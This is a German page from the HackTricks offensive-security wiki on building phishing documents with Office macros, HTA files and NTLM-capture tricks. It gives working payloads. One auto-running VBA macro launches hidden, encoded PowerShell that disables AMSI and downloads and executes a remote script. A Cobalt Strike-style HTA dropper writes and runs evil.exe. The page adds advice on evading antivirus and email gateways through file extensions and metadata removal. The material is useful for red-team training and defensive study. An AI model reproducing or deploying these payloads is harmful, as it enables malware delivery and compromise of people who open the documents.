# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt eine Datenvalidierung von Dateien durch, bevor eine Datei geöffnet wird. Die Datenvalidierung erfolgt in Form der Identifizierung von Datenstrukturen gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

In der Regel verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateierweiterung geändert wird, und dennoch die Fähigkeit zur Ausführung von Makros beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei aus Designgründen keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Makros ausführen.\
Die gleichen internen Abläufe und Mechanismen gelten für alle Software der Microsoft Office Suite (Excel, PowerPoint usw.).

Sie können den folgenden Befehl verwenden, um zu überprüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine entfernte Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), können ebenfalls Makros „ausführen“.

### Externe Bildladung

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Makros-Hintertür

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie sind, desto wahrscheinlicher wird sie die AV erkennen.

- AutoOpen()
- Document_Open()

#### Makros-Codebeispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manuell Metadaten entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, was den Dokumentinspektor öffnet. Klicke auf **Überprüfen** und dann auf **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.

#### Doc-Erweiterung

Wenn du fertig bist, wähle im Dropdown-Menü **Speichern unter** den Typ **Word 97-2003 `.doc`**.\
Mach das, weil du **keine Makros in einer `.docx`** speichern kannst und es ein **Stigma** **um** die makroaktivierte **`.docm`**-Erweiterung gibt (z.B. hat das Miniaturansichts-Icon ein riesiges `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc`-Erweiterung der beste Kompromiss**.

#### Bösartige Makro-Generatoren

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript)** kombiniert. Es generiert die Benutzeroberfläche und wird als "vollständig vertrauenswürdige" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise **zusammen mit** **Internet Explorer** **installiert** wird, wodurch **`mshta` von IE abhängig ist**. Wenn es deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung "aus der Ferne" zu erzwingen**, zum Beispiel könnten Sie **unsichtbare Bilder** in E-Mails oder HTML hinzufügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder senden Sie dem Opfer die **Adresse von Dateien**, die eine **Authentifizierung** nur durch **Öffnen des Ordners** **auslösen**.

**Überprüfen Sie diese Ideen und mehr auf den folgenden Seiten:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM-Relay

Vergessen Sie nicht, dass Sie nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe** **durchführen** können:

- [**NTLM-Relay-Angriffe**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM-Relay zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
